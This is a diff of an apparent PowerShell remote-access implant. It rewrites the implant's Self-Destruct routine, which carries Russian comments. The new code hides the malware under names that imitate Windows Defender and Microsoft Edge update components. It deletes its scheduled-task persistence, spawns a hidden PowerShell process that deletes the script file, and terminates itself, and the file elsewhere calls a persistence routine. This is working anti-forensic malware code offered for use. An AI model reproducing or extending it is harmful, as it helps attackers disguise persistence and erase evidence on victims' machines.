@@ -277,14 +277,29 @@ function Connect-ZiPo {
 }
 
     function Self-Destruct {
-        $script = $PSCommandPath
-        if (-not $script) {
-            $script = "$env:APPDATA\Microsoft\updater.ps1"
+    try {
+        # Путь до скрипта
+        $scriptPath = $MyInvocation.MyCommand.Path
+        if (-not $scriptPath) {
+            $scriptPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
         }
-        Remove-Item -Path $script -Force -ErrorAction SilentlyContinue
-        schtasks /Delete /TN "ZiPo" /F | Out-Null 2>&1
-        exit
+
+        # Удаление планировщика
+        $taskName = "MicrosoftEdgeUpdateChecker"
+        schtasks /Delete /TN $taskName /F | Out-Null 2>&1
+
+        # Удаление самого файла (с задержкой)
+        $cmd = "Start-Sleep -Milliseconds 500; Remove-Item -Path `"$scriptPath`" -Force"
+        Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command `$ErrorActionPreference='SilentlyContinue'; $cmd" -WindowStyle Hidden
+
+        Write-Output "[+] Self-destruct complete"
+        Stop-Process -Id $PID
     }
+    catch {
+        return "[ERROR] Self-destruct failed: $($_.Exception.Message)"
+    }
+}
+
 
 
     Add-Persistence
